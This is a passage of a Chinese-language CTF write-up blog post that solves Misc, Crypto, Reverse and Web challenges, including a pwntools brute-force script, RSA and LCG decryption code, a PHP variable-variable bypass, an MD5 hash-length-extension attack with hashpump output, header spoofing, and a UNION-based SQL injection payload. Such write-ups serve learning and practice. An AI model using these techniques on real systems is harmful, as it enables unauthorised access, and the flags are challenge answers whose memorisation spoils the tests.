lolo_2.png --result lolo_3.png</code></pre><img data-src="https://ae01.alicdn.com/kf/U19a7d709be264d51ab7a7bd55978152bW.png" data-webp-src="https://ae01.alicdn.com/kf/H18da7c4d49a843c09e05896083981211x.jpg"><p>不过小透明忍不住想吐槽一下这题，因为……</p><p><strong>完 全 一 致</strong></p><p>实际上这题和去年“新生杯”的类似题用的是同一种盲水印。比赛前还想着“今年是不是又要出一个一模一样的”，没想到真的出了(´ﾟωﾟ｀)</p><p>但是去年的<a href="http://blog.leanote.com/post/xp0int/%E6%9F%AF%E5%93%80" target="_blank" rel="noopener">官方 Write-Up</a> 里面都在自我吐槽“这题出的不是很好，有些盲水印脚本无法解出答案，暂时未去了解为什么”了啊！而且周围有不少小伙伴们试过好几种其它的盲水印工具，确实都解不出来，所以这题实际上是在考信息搜索能力……？(=’_‘=)</p><h2 id="wewuwewu"><a href="#wewuwewu" class="headerlink" title="wewuwewu"></a>wewuwewu</h2><p>首先，这实际上是个 JPEG 图片。然后，翻二进制数据的话……</p><img data-src="https://ae01.alicdn.com/kf/U792671448653417b88e40c28b91e82779.png" data-webp-src="https://ae01.alicdn.com/kf/Hbbb0371371d640b38e12787e03ef3c6ai.jpg"><h2 id="rainbow"><a href="#rainbow" class="headerlink" title="rainbow"></a>rainbow</h2><img data-src="https://ae01.alicdn.com/kf/H7739931f6438448380be519b567b6ee87.png" data-webp-src="https://ae01.alicdn.com/kf/H41d2b01b50fb45bea22f7b478a8aa617r.jpg"><p>左起，每个色块的颜色和对应的字符：</p><ul><li>0x000031 1</li><li>0x300000 0</li><li>0x003100 1</li><li>0x000031 1</li><li>0x630000 c</li><li>0x006800 h</li><li>0x000041 A</li><li>0x730000 s</li><li>0x000033 3</li><li>0x5f0000 _</li><li>0x003100 1</li><li>0x480000 H</li><li>0x006500 e</li><li>0x5f0000 _</li><li>0x007200 r</li><li>0x000061 a</li><li>0x004900 I</li><li>0x6e0000 n</li><li>0x000062 b</li><li>0x003000 0</li><li>0x000077 w</li><li>0x002100 !</li><li>0x000021 !</li><li>0x003100 1</li><li>0x000032 2</li><li>0x003200 2</li><li>0x000037 7</li></ul><p>加上 flag 的头和尾，得到的就是 <code>flag{1011chAs3_1He_raInb0w!!1227}</code>。</p><h2 id="NoMansLand"><a href="#NoMansLand" class="headerlink" title="NoMansLand"></a>NoMansLand</h2><img data-src="https://ae01.alicdn.com/kf/U024afe9149fe47deb99b91e1483f02570.png" data-webp-src="https://ae01.alicdn.com/kf/Hcfee6d848ea040a68b3dc0ad7258a9a7X.jpg"><p><del>改一个字就加一个 Commit，这样我的 GitHub 主页上的日历也可以是绿油油的一片啦！</del></p><h2 id="Music"><a href="#Music" class="headerlink" title="Music"></a>Music</h2><img data-src="https://ae01.alicdn.com/kf/Ud0527412a156492ca70f29d9249759430.png" data-webp-src="https://ae01.alicdn.com/kf/Hf4acfaa1e15f4e1c9d653a8cfbcdcf81X.jpg"><p>音符加密（<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue" target="_blank" rel="noopener">这里</a>是工具），这道题和“与佛论禅”、核心价值观是一个性质……</p><h2 id="carefully"><a href="#carefully" class="headerlink" title="carefully"></a>carefully</h2><img data-src="https://ae01.alicdn.com/kf/U0497674513654a3cb039b5cf395d6481B.png" data-webp-src="https://ae01.alicdn.com/kf/H60aae98ea6354dca8c47571afb91337cT.jpg"><p>核心价值观解密（<a href="https://z.duoluosb.com/" target="_blank" rel="noopener">这里</a>是工具），得到 <code>g1v_vmxibk1rlm_1h_u4mmb_4m1_45yv11vezyov</code>，试了各种单表替换密码后发现是密码是反方向字母表，又称 Atbash（<a href="https://tool.bugku.com/jiemi/" target="_blank" rel="noopener">这里</a>是工具），数字和下划线不参与编码（看上去确实是这么回事），最后得到 <code>flag{t1e_encryp1ion_1s_f4nny_4n1_45be11evable}</code>。</p><img data-src="https://ae01.alicdn.com/kf/U031ce1068e854bedaba00d03ca98137fY.png" data-webp-src="https://ae01.alicdn.com/kf/Ha2e87479a8e74057ba44c8925555112eJ.jpg"><h2 id="Guess"><a href="#Guess" class="headerlink" title="Guess"></a>Guess</h2><p>个人觉得是 Misc 里最有技术含量的一题，大概是因为需要用到脚本？</p><img data-src="https://ae01.alicdn.com/kf/Ub502739007b84aa1904517969450d7c5L.png" data-webp-src="https://ae01.alicdn.com/kf/H116bbd6e49074b9d947ede6d03e69865M.jpg"><p>用 pwntools 连上服务器，这个藏着的东西大概就是 flag 了，如果输错了会返回 <code>Oops!</code>，全部输对了应该会有提示，那如果部分输对了话……</p><p>是<strong>没有任何输出</strong>的哦？|･ω･｀)</p><p>根据惯例，flag 应该由大小写字母和数字和各种符号组成，开头必然是 <code>flag{</code>，剩下的就需要一个个慢慢<strong>爆破</strong>了。</p><pre><code class="python">#!/usr/bin/env python

from pwn import *

# 已知的前几个字
flag = &#39;flag{&#39;
# 为了加快爆破速度，按照字符在 flag 中的出现概率降序排列字符集（滑稽）
charset = &#39;abcdefghijklmnopqrstuvwxyz0123456789-_ABCDEFGHIJKLMNOPQRSTUVWXYZ{}!&#39;

p = remote(&#39;35.194.143.125&#39;, 30001)

# 爆破的原理是从字符集中逐个尝试将字符追加到已知的 flag 后面
# 如果错误，下一行就是 Oops!
# 如果正确，下一行就是 I wanna give you sth
# 如果追加的字符是 }，就结束爆破输出 flag
akarin_have_girlfriend = False
while not akarin_have_girlfriend:
    end = False
    for char in charset:
        p.recv()
        p.sendline(&#39;4&#39;)
        p.recv()
        p.sendline(flag + char)
        result = p.recvline()
        print(&#39;Trying: &#39; + char)
        if result == &#39;Oops!\n&#39;:
            print(&#39;Fail.&#39;)
        elif result == &#39;I wanna give you sth\n&#39;:
            flag += char
            print(&#39;Found! Now Akarin get: &#39; + flag)
            if char == &#39;}&#39;:
                end = True
            break
    if end:
        print(&#39;The flag is: &#39; + flag)
        break</code></pre><img data-src="https://ae01.alicdn.com/kf/Ub944719cd46f439eb892f6f2ae998ac0Y.png" data-webp-src="https://ae01.alicdn.com/kf/H7c078b8f02604a1fbabc5754a4446b70j.jpg"><p><code>flag{Pyth0n_1s_s0_mmmmmm4g1111calll!!!}</code>，不过爆破成功了却连个提示语都没有，不应该啊ﾍ(‘.’o)</p><p><del>由此可见，Python 是世界上最好的语言！</del>（PHP 党激怒）</p><h2 id="nopan"><a href="#nopan" class="headerlink" title="nopan"></a>nopan</h2><blockquote><p>“知道百度网盘怎样上传文件吗？”——官方提示</p></blockquote><p>没有尝试过各种手段和在<del>即将进入全面小康社会的</del> 9102 年仍然坚持通过限速让用户<strong>梦回二十年前用拨号上网的速度下载文件</strong>的万恶的百度网盘做过斗争的人，大概是做不出这题的|-` )</p><blockquote><p>好久不见。上次你提到的那个文件，我已经把它上传到■■网盘里了。网盘链接和提取码如下：</p><p>链接：<a href="https://pan.baidu.com/s/1ehuW4C6s16Wm4U91f7kKCw" target="_blank" rel="noopener">https://pan.■■■■■.com/s/1ehuW4C6s16Wm4U91f7kKCw</a><br>提取码：■■■■</p><p>最近我很忙，可能要很久才能回复。注意别把链接和提取码搞丢了。</p></blockquote><p><del>但是你真的就弄丢了⊂彡☆))д`)</del></p><blockquote><p>最近网盘的下载速度越来越慢了。我担心你文件没有下载完，网络就断开了。以防万一，请校检下载的文件是否符合以下哈希值：</p><p>文件名：■■■■■■■■<br>文件大小: 2865514（2.8MB）<br>MD5 : 3571407E1F0D73B789F2232448680CD1<br>SHA-1: 0561C239AA1F29A68269FC8A03E442E691CBF6FA<br>CRC32: 0E250626</p></blockquote><p><del>你也知道辣鸡百度网盘限速啊？</del></p><img data-src="https://ae01.alicdn.com/kf/Uba2833a5a2ad46a08f71f591f60e5246y.png" data-webp-src="https://ae01.alicdn.com/kf/Hbba04230277d4a4cbbe04c9a0b606f43x.jpg"><p>各种“万能钥匙”并没有什么效果，强行爆破那个分享链接的密码更是不可能的事情。</p><p>实际上，分享链接不重要，这几个 Hash 才是重点。题目的附件还有上面这张图片，用 Photoshop 打开会提示“遇到意外的文件尾”等等，显然是图片的数据被强行截断了。当然，分享的文件名应该就是 <code>flag.png</code>。</p><p>有个命令行版百度网盘客户端 <a href="https://github.com/iikira/BaiduPCS-Go" target="_blank" rel="noopener">BaiduPCS-Go</a> 自带了“手动秒传”的功能。百度网盘秒传的原理是判断文件的长度、完整文件和文件的前 256KB 的 MD5、CRC32。现在这些值都有了，就可以把文件<strong>直接秒传</strong>到自己的网盘上。</p><p>“文件的前 256KB 的 MD5”可以通过现在手上的这半截图片再截取前 256KB，然后用各种工具算出来：<code>875B6EB10090EB3127D206F35A4B277E</code></p><p>然后使用 BaiduPCS-Go 输入命令：</p><pre><code class="bash">ru -length=2865514 -md5=3571407E1F0D73B789F2232448680CD1 -crc32=0E250626 -slicemd5=875B6EB10090EB3127D206F35A4B277E /flag.png
d /flag.png --nocheck</code></pre><p>就可以下载到原图然后直接看到 <code>flag{2995_ke3p_clam_and_enj0y_y0ur_fl1ght_300}</code>，还好不需要继续折腾隐写什么的……</p><img data-src="https://ae01.alicdn.com/kf/H350d88a8756c4a16a835c08cc48fecd4c.jpg" data-webp-src="https://ae01.alicdn.com/kf/He19e0f047fda46bdbe1c632ae2ac9f58j.jpg"><p>（上面这张不是原图，上传到图床前小透明自己把图片压缩了）</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="really-encrypted"><a href="#really-encrypted" class="headerlink" title="really_encrypted"></a>really_encrypted</h2><p><del>不言而喻，一目了然，真・签到题</del></p><p>栅栏密码（<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php" target="_blank" rel="noopener">这里</a>是工具），<code>flag{Ai8sh5wbxj0whksjshdyw3}</code>。</p><img data-src="https://ae01.alicdn.com/kf/U4b42dff04e3a431daa6b1d096f6189e33.png" data-webp-src="https://ae01.alicdn.com/kf/H9f51e2bbbb8e44b98e11ff9ab1738c61Y.jpg"><h2 id="easyrsa"><a href="#easyrsa" class="headerlink" title="easyrsa"></a>easyrsa</h2><p>RSA 解密需要求模除法逆元，从 <a href="https://stackoverflow.com/questions/4798654/modular-multiplicative-inverse-function-in-python/29762148#29762148" target="_blank" rel="noopener">Stack Overflow</a> 上找到了一个非常实用的匿名函数可以直接实现逆元的计算：</p><pre><code class="python">MMI = lambda A, n,s=1,t=0,N=0: (n &lt; 2 and t%N or MMI(n, A%n, t, s-A//n*t, N or n),-1)[n&lt;1]
MMI(23, 99) # 56
MMI(18, 24) # -1</code></pre><p>开始看题：</p><pre><code class="plaintext">n = 18166111488983638423176654225038910650374178404043258136863317940757240374883045318227630220114908148002528619687208976201483203446705228237820608531034600157346418730110800833894198105113069673034318791074080878803821797374439187892933762426303490171060652425319592687318992422979831460606780689490127157122450326817694644127955168509718422226505201308410281564018832558025316135527711604948983206569045881358071837726506411561445950018434181828539749068924458242255898899889941894373420604283541696070823346969159662074221543706652525690955057870664198106495869582165707721782854117610672456879034154898769471938117
e = 65537
c = 16557540364154395713558646669072741937615342260542036031952182998548657011824978776677484944354752850867643908247704032511389420321541306432748843707416654616686046776804432102455821985542337552330254302403535524234293479604198963438410959320502344078024576646316377856554837978984863667052517437922967926155676374386985386995490935331458679889799199387332376735566839929210890931308968597230699243910342515468179185950859704753759493976488271753912140439374347388198468842216991965867366259721821413872154269673724400345270897275549939948544776957761650034569256088810092045614520316608497052245790834163200510667772</code></pre><p>把 n 丢进 <a href="http://factordb.com/index.php?query=18166111488983638423176654225038910650374178404043258136863317940757240374883045318227630220114908148002528619687208976201483203446705228237820608531034600157346418730110800833894198105113069673034318791074080878803821797374439187892933762426303490171060652425319592687318992422979831460606780689490127157122450326817694644127955168509718422226505201308410281564018832558025316135527711604948983206569045881358071837726506411561445950018434181828539749068924458242255898899889941894373420604283541696070823346969159662074221543706652525690955057870664198106495869582165707721782854117610672456879034154898769471938117" target="_blank" rel="noopener">FactorDB</a> 可以分解出 p 和 q，然后就可以得到 m。</p><pre><code class="plaintext">p = 130456283857645025762691023898845608928710362686294851221450093824533197549806631148867242691844441160576320773904432512838379590127986113818416101086695539425149571612979342889778360825402727498529748702035429662584726706609716114370652011043194792995908818094170934656989995629482678233000685983090325365549
q = 139250566947059823453625463016686669261826444361819002282335838853816828667839799789393680821194880353192071200076880361361848345889074292932450446910930443112614763933390287115641256150843558712707320218852675477962227409197464100372762134803009018827495653979157431219931338408129724157546988493768646375033
m = 4079298574924100380882798141080777519551699955439474094729924030825463150621200292859549484308473511195982027523392939998962139796530757717099548565227012907221461316960947880602936490993085237650824412891417747519</code></pre><p>把 m 转换为字符串（这其实是在造轮子了）：</p><pre><code class="python">hex_m = hex(m)[2:] # 去掉开头的0x
decoded = &#39;&#39;
for i in range(0, len(hex_m), 2):
    decoded += chr(int(hex_m[i:i+2], 16))</code></pre><p>得到的字符串是 <code>0x1337 ^ (-1) mod 0x18a39cb09e40671788a6b9221371e3f5455bbde2aff984e491c85f4f3ad309613 = ?</code>，所以还需要继续进行计算。</p><pre><code class="python">calc = MMI(0x1337, 0x18a39cb09e40671788a6b9221371e3f5455bbde2aff984e491c85f4f3ad309613)
hex_calc = hex(calc)[2:]
decoded = &#39;&#39;
for i in range(0, len(hex_calc), 2):
    decoded += chr(int(hex_calc[i:i+2], 16))</code></pre><img data-src="https://ae01.alicdn.com/kf/Hc73b6c2a91da4db28f2b183b23081dcba.jpg" data-webp-src="https://ae01.alicdn.com/kf/Hed6e0c191cc74da2a9ee3c896c06bfeeG.jpg"><p><code>flag{456_easy_rsa_challenge_657}</code></p><h2 id="My-kingdom"><a href="#My-kingdom" class="headerlink" title="My kingdom"></a>My kingdom</h2><p>还是 Hex 转 ASCII，得到文本：</p><pre><code class="plaintext">K ecog, K ucy, K eqpswgtgf.
Eqyctfu fkg ocp{ vkogu dghqtg vjgkt fgcvju,vjg xcnkcpv pgxgt vcuvg qh fgcvj dwv qpeg.
Uckf d{ Lwnkwu Ecguct, Tqocp Ngcfgt
Lwuv nkmg yjcv Ecguct uckf, {qw eqpswgtgf, {qw fgugtxg kv.
hnci{e2o5_ucy_Lq3p_63f_E2psw5tg_evh!}</code></pre><p>最后一行很像是 flag，经过测试是 +2 的凯撒密码，用 -2 把它复原。</p><p><del>因为解密工具抹平了大小写，还无视了数字，结果搞出了一大堆提交失败的记录⊂彡☆))д`)</del></p><pre><code class="plaintext">I came, I saw, I conquered.
Cowards die man{ times before their deaths,the valiant never taste of death but once.
Said b{ Julius Caesar, Roman Leader
Just like what Caesar said, {ou conquered, {ou deserve it.
flag{c0m3_saw_Jo1n_41d_C0nqu3re_ctf!}</code></pre><p><code>flag{c0m3_saw_Jo1n_41d_C0nqu3re_ctf!}</code></p><h2 id="lincoin"><a href="#lincoin" class="headerlink" title="lincoin"></a>lincoin</h2><pre><code class="python">from Crypto.Util.number import bytes_to_long
from FLAG import flag

class LCG:
    a = 0xdb626d86f5dc6cf4ec8c4ca4f4b9dab3
    b = 0xb2dab99e8973e463ab58a4403d35675f
    n = 0xd5aef35973977bd35331490990b6b54b80d44bdb621f861848f4377c54cf6649

    def __init__(self, init_seed):
        assert init_seed &lt; self.n
        self.state = init_seed

    def rand(self):
        self.state = (self.a * self.state + self.b) % self.n
        return self.state

    def __str__(self):
        return str(self.rand())

seed = bytes_to_long(flag)
lcg = LCG(seed)

times = 2 ** 30
while times &gt; 0:
    lcg.rand()
    times -= 1

print(lcg) # 0xaf08e8ece96f637d3719fa1c4f0a9f88b3d330615108dd36f430c159308395b2</code></pre><p>本体是个<a href="https://zh.wikipedia.org/zh-hans/%E7%BA%BF%E6%80%A7%E5%90%8C%E4%BD%99%E6%96%B9%E6%B3%95" target="_blank" rel="noopener">线性同余随机数产生器（LCG）</a>，把 flag 转为 Hex 然后设为种子，生成了 ${2^{30}}$ 次随机数。</p><p>LCG 的原理是：设定参数 a、b、n 以及种子 ${X_0}$，之后的每个随机数按照公式 $$X_n = (a \times X_{n-1} + b) \bmod n$$ 递推生成。</p><p><a href="https://stackoverflow.com/questions/2911432/reversible-pseudo-random-sequence-generator" target="_blank" rel="noopener">Stack Overflow</a> 上面有人写出了“反向 LCG”的算法（当然也可以自己反推），从当前随机数 $X_n$ 反推 LCG 生成的上一个随机数 $X_{n-1}$ 的公式是 $$X_{n-1} = a^{-1} \times (X_n - b) \bmod n$$ 其中 $a^{-1}$ 是 a 的模 n 除法逆元（继续用 <code>MMI</code> 函数计算）。</p><p>写代码求解，因为循环次数太多，运行需要很长的时间，所以按了回车之后，可以去阳台上看看风景，<del>或者和妹子出去散个步什么的</del>（你怎么可能会有女朋友？）</p><pre><code class="python">def reverse_LCG(rnd):
    # a = 0xdb626d86f5dc6cf4ec8c4ca4f4b9dab3
    b = 0xb2dab99e8973e463ab58a4403d35675f
    n = 0xd5aef35973977bd35331490990b6b54b80d44bdb621f861848f4377c54cf6649
    a_inv = 57217878573518668316807000375554927755910762980319730425669837644426658111070 # MMI(a, n)
    return (a_inv * (rnd - b)) % n

rnd = 0xaf08e8ece96f637d3719fa1c4f0a9f88b3d330615108dd36f430c159308395b2
for i in range(2 ** 30 + 1):
    # 进度条（大误）
    if i % 100000 == 0:
        print(&#39;\r&#39; + str(i), end=&#39;&#39;)
    rnd = reverse_LCG(rnd)

print()
print(rnd)</code></pre><p>过了很久很久很久很久……终于算出来了，种子是 <code>180966415225526098453856893299872427450627808844390491008662352366530869117</code>，继续转字符串，得到 <code>flag{541_LCG_iS_A_baD_pRng_167}</code>。</p><p>（发现自己做的时候忘了截图，重新算一遍又要好长时间，就不截图了吧）</p><p>（其实 <code>from Crypto.Util.number import bytes_to_long</code> 是可以直接整数转换为字节的）</p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="easyRE"><a href="#easyRE" class="headerlink" title="easyRE"></a>easyRE</h2><img data-src="https://ae01.alicdn.com/kf/U892f389b5a334cb99dd178535224c49ev.png" data-webp-src="https://ae01.alicdn.com/kf/Hcd8d9283bba04da4b458baa0e0723e9ec.jpg"><p>IDA 一开，有个字符串 <code>ZmxhZ3tSM19XMXRoX2I0c2U2NF8xc19zMW1wbGVfMG4zfQ==</code>，估计是 Base64，实际上真的是 Base64，解码后得到 <code>flag{R3_W1th_b4se64_1s_s1mple_0n3}</code>。</p><h2 id="easyELF"><a href="#easyELF" class="headerlink" title="easyELF"></a>easyELF</h2><img data-src="https://ae01.alicdn.com/kf/U398021ae3c344a0ea8934a8597152bc6U.png" data-webp-src="https://ae01.alicdn.com/kf/H1012d4b8abfc457dbfe46203f2d6c339M.jpg"> <img data-src="https://ae01.alicdn.com/kf/U98f4cb8c4c8d45e5aa8860e3da808de1g.png" data-webp-src="https://ae01.alicdn.com/kf/He859489b13da4e58abaab7b56800008df.jpg"><p>用 IDA 打开本体，发现 <code>sub_4006CB</code> 比较可疑，再点进去，发现 <code>v7</code> 也比较可疑……</p><img data-src="https://ae01.alicdn.com/kf/Ubaf9eb9d05334c8b92e93ed97d838e8fw.png" data-webp-src="https://ae01.alicdn.com/kf/H0eda6b879e48498192e7e15d00cc053ay.jpg"><p>下断点动态调试，flag 保存在了 <code>v7</code>：<code>flag{Here_are_yo_To_be_interested_and_excited}</code></p><p><del>你们搞的这个比赛啊，excited！</del></p><h2 id="reverseMe"><a href="#reverseMe" class="headerlink" title="reverseMe"></a>reverseMe</h2><p>输入一个字符串，这个字符串被进行了一堆操作后将会和 <code>+wXp+xDkldnFdFNFdxnzdFWpGx2m</code>（应该就是操作后的 flag）比对。这个应该不是 Base64 了……吗？</p><img data-src="https://ae01.alicdn.com/kf/Udfa607153f7d4f0c9b3478411ffb38afk.png" data-webp-src="https://ae01.alicdn.com/kf/H77ad2c18b3d04164a5c0750e8b4c9592n.jpg"><p>对比一下现有的 C 语言计算 Base64 的代码可以说是完全一致，所以这个操作还是在算 Base64。</p><img data-src="https://ae01.alicdn.com/kf/U73ddfc5b07ec4ec8ac9ee69665f10223D.png" data-webp-src="https://ae01.alicdn.com/kf/Hb15829b87db14f12a4b57e15be3c7df9U.jpg"><p>继续翻变量，可以发现字符表不是 <code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code> 而是 <code>R9Ly6NoJvsIPnWhETYtHe4Sdl+MbGujaZpk102wKCr7/ODg5zXAFqQfxBicV3m8U</code>，所以继续写代码先转换成出原版 Base64 再拿去解码：</p><pre><code class="python">ori = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#39;
mod = &#39;R9Ly6NoJvsIPnWhETYtHe4Sdl+MbGujaZpk102wKCr7/ODg5zXAFqQfxBicV3m8U&#39;
flag_mod = &#39;+wXp+xDkldnFdFNFdxnzdFWpGx2m&#39;
flag_ori = &#39;&#39;
for i in flag_mod:
    flag_ori += ori[mod.index(i)]
print(flag_ori)</code></pre><img data-src="https://ae01.alicdn.com/kf/H5f78eda467704cbe9c0750e31f83f354q.jpg" data-webp-src="https://ae01.alicdn.com/kf/H330650a36f8746149c4f7f7166c95d22X.jpg"><p>转换为原版 Base64 是 <code>ZmxhZ3tiYXMzXzFzX3MwXzNhc3l9</code>，解码后得到 <code>flag{bas3_1s_s0_3asy}</code>。</p><p>顺便看了一下源代码。经过实验，大量出现的 <code>(unsigned __int64)(0xAAAAAAAAAAAAAAABLL * (unsigned __int128)var &gt;&gt; 64) &gt;&gt; 1</code> 相当于求 <code>var</code> 整除 <code>3</code>，具体原理不得而知，<del>大概是参考了平方根倒数速算法</del>。</p><img data-src="https://ae01.alicdn.com/kf/Hf15400e638834de1a09b71c4ad68b782q.jpg" data-webp-src="https://ae01.alicdn.com/kf/H9d864746dc24418384d40800d5a7f8fcF.jpg"><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="BabyUpload"><a href="#BabyUpload" class="headerlink" title="BabyUpload"></a>BabyUpload</h2><img data-src="https://ae01.alicdn.com/kf/U59741b2806bb4d2db60deb7205d550fdj.png" data-webp-src="https://ae01.alicdn.com/kf/H9dbcf1e005044e3c86a75a49262dc75aF.jpg"><p>文件内容不重要，只要在上传的时候把文件名改过来就行～然后就可以得到 <code>flag{w311_D0ne!}</code>。</p><h2 id="EasyUpload"><a href="#EasyUpload" class="headerlink" title="EasyUpload"></a>EasyUpload</h2><p><del>我差点觉得这题应该叫 DifficultUpload</del></p><p><del>比上次多了黑名单验证机制，只要扩展名是 php、php3、php4、php5、php7、pht、phtml 就会 Connection reset。</del></p><p>只要用 Burpsuite 抓包改完重发就会出现 Connection reset，原因不明，结果试了一晚上绕过方法，导致这题耽误了很久(｡í _ ì｡)</p><p>后来才发现 Burpsuite 还有个 Repeater 能用……</p><img data-src="https://ae01.alicdn.com/kf/U7e633395987b42d5a6436de5d7c5e92ai.png" data-webp-src="https://ae01.alicdn.com/kf/Hbbaad66de92a4e2697286882d8c1a565a.jpg"><p>继续改文件名，然后按照提示在图片数据的无关紧要的位置加 <code>givemeflag</code>，就能看到 flag 了：<code>flag{SHjdbe7pIUD02847SDHD}</code>。</p><img data-src="https://ae01.alicdn.com/kf/U2b06bba9f9934fc79d39e3acd3c31251g.png" data-webp-src="https://ae01.alicdn.com/kf/H0071122a519f4893ab0479f459f9962eX.jpg"><h2 id="EasyGame"><a href="#EasyGame" class="headerlink" title="EasyGame"></a>EasyGame</h2><img data-src="https://ae01.alicdn.com/kf/U6f9bafce3b7f449bbbd3102cbcfd642dP.png" data-webp-src="https://ae01.alicdn.com/kf/Hc6f0872601eb4bd89ee5a5c988bbe7c5T.jpg"><p>按照提示加 GET 和 POST 参数，然后请求头加个 <code>X-Forwarded-For: 127.0.0.1</code> 假装是管理员自己上了服务器打开这个页面就可以得到 <code>flag{Y0ur_pHp_1s_s1xsix6}</code>。</p><h2 id="BabyPHP"><a href="#BabyPHP" class="headerlink" title="BabyPHP"></a>BabyPHP</h2><p>可变变量漏洞。虽然有 <code>$_POST</code> 但是完全不用管它，直接以 GET 方式访问，参数：<code>akarin=flag&amp;flag=akarin</code> 即可得到 <code>flag{GSH1ydsbnYtshkjhs}</code>。</p><p>（参数的 <code>akarin</code> 可替换为任意内容，但是参数顺序不能变）</p><pre><code class="php">// 因为不是用 POST 访问，所以 isset($_POST[&#39;flag&#39;] )为 false，取反后为 true
// isset($_GET[&#39;flag&#39;]) 为 true，取反后为 false，所以不执行
if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;])){
    exit($msg_giveme);
}

// 已绕过
if($_POST[&#39;flag&#39;] === &#39;flag&#39; || $_GET[&#39;flag&#39;] === &#39;flag&#39;){
    exit($msg_getout);
}

// 因为没有 $_POST，这一段也跳过了
foreach ($_POST as $key =&gt; $value) {
    $$key = $value;
}

// 实际执行的顺序：
// $akarin = $flag;
// $flag = $akarin;
// 结果：flag 毫发无损
foreach ($_GET as $key =&gt; $value) {
    $$key = $$value;
}

echo &#39;the flag is : &#39; . $flag;</code></pre><img data-src="https://ae01.alicdn.com/kf/Uf6a3cea05dab4cf88616afae7c14173bd.png" data-webp-src="https://ae01.alicdn.com/kf/H5569924e84a5401cbbfa72dfd202e9c5i.jpg"><h2 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h2><p>翻注释然后去 <code>http://35.194.143.125:4517/source.txt</code> 看源代码。</p><pre><code class="php">&lt;?php
$flag = &quot;XXXXXXXXXXXXXXXXXXXXXX&quot;;
$secret = &quot;XXXXXXXXXX&quot;; // 十个字符，这是解题的关键

if(!isset($_POST[&quot;username&quot;]) || !isset($_POST[&quot;password&quot;])){
    exit();
}
$username = $_POST[&quot;username&quot;];
$password = $_POST[&quot;password&quot;];

if (!empty($_COOKIE[&quot;check&quot;])) {

    if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) {
        if ($_COOKIE[&quot;check&quot;] === md5($secret . urldecode($username . $password))) {
            echo &quot;Login successful.\n&quot;;
            die (&quot;The flag is &quot;. $flag);
        }
        else {
            die (&quot;Wrong Cookies. Get out!&quot;);
        }
    }
    else {
        die (&quot;Admins only&quot;);
    }
}

// 这里得到的 MD5 是 f7fa8882c893a3f48f3cecdaa2f52102，固定不变
setcookie(&quot;ahash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));
?&gt;</code></pre><p><del>目标是找到 <code>$username</code> 和 <code>$password</code>，符合以下要求：</del></p><ul><li><del><code>urldecode($username) === &quot;admin&quot;</code></del></li><li><del><code>urldecode($password) != &quot;admin&quot;</code></del></li><li><del><code>urldecode($username . $password) === &quot;adminadmin&quot;</code></del></li></ul><p>↑不存在的（doge）</p><p>找了一下，关键词是“MD5 的 HASH 扩展攻击”。参见：<a href="https://www.cnblogs.com/pcat/p/5478509.html" target="_blank" rel="noopener">https://www.cnblogs.com/pcat/p/5478509.html</a></p><p>所以就去虚拟机装上 <code>hashpump</code>，然后设置 Cookie 为生成的 MD5，设置 <code>password</code> 为另外那一堆很长的值，然后就可以得到 <code>flag{G_du93ksy639_sjd}</code>。</p><pre><code class="plaintext">root@kali:~# hashpump
Input Signature: f7fa8882c893a3f48f3cecdaa2f52102
Input Data: admin
Input Key Length: 15
Input Data to Add: yuruyuri
357ea255861079bcbcdff9035290e554
admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x00\x00\x00\x00\x00\x00\x00yuruyuri</code></pre><img data-src="https://ae01.alicdn.com/kf/U619df79cacdd4579b24ce862f1b1675cu.png" data-webp-src="https://ae01.alicdn.com/kf/Hcc8cc92b2d3e4895be9a9c9b45e78a514.jpg"> <img data-src="https://ae01.alicdn.com/kf/U8bdcbcc1d84a4d96a3cf3c1bab2980b0S.png" data-webp-src="https://ae01.alicdn.com/kf/H5f5bb0a079714f08902bd54136f64d650.jpg"><h2 id="Babysql"><a href="#Babysql" class="headerlink" title="Babysql"></a>Babysql</h2><img data-src="https://ae01.alicdn.com/kf/U9bdb510bc2f44d2dae6582411b0b8d237.png" data-webp-src="https://ae01.alicdn.com/kf/Hc75de0f8d0c54d9aa0ef5c66f225a5d5A.jpg"><p>其实用 <code>UNION</code> 直接注入就可以了，一开始就想到了这个，不过因为没有语句闭合所以很久都没做出来……输入 <code>-1&#39; UNION SELECT flag,flag,flag FROM flag#</code> 就可以得到 <code>flag{Hh_N1c3_1}</code>。</p><p>“语句闭合”指的是碰到 <code>... WHERE id = &#39;***</code> 这种语句，将 *** 设为 <code>1&#39; UNION ...</code> 而不是 <code>1</code>，组合后的语句就是 <code>... WHERE id = &#39;1&#39; UNION ...</code> 而不是 <code>WHERE id = &#39;1 UNION ...</code>，后者显然是有问题的。</p><p>不过按照题目上的源代码，不闭合不注释输入 <code>-1 UNION SELECT flag,flag,flag FROM flag</code> 构成 <code>SELECT * FROM users where id=-1 UNION SELECT flag,flag,flag FROM flag</code> 应该也是没问题的，但是实际上必须要有闭合和注释，也许是题目的代码给错了……？</p><p>SQL 语句中有某些单词的话，就会直接返回“hacker!”，这是为了防止删库跑路吧 233</p><h2 id="SELECT-me-Easysql"><a href="#SELECT-me-Easysql" class="headerlink" title="SELECT_me! Easysql"></a><del>SELECT_me!</del> Easysql</h2><p><del>官方改名，果然是续作</del></p><img data-src="https://ae01.alicdn.com/kf/Ue2103291212343c28ba9be0eaa9399a5o.png" data-webp-src="https://ae01.alicdn.com/kf/H942ba2578cad424692d911f39fb153b9K.jpg"><p>上一题的<strong>续作</strong>，这次就算只输入一个空格也会出现“hacker!”，解决方法是用注释 